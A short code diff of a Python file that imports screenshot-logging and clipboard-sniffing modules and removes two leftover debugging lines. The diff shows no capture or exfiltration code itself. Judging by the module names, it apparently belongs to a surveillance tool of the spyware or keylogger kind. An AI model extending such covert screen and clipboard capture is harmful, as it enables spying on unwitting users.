@@ -3,8 +3,6 @@ from screenshot_log.screenshot_logger import ScreenshotLogger
 from clipboard_sniffer.clipboard_module import ClipboardLogger
 import threading
 import sys
-import clipboard_sniffer.clipboard_module
-print(dir(clipboard_sniffer.clipboard_module))
 
 sys.dont_write_bytecode = True
 
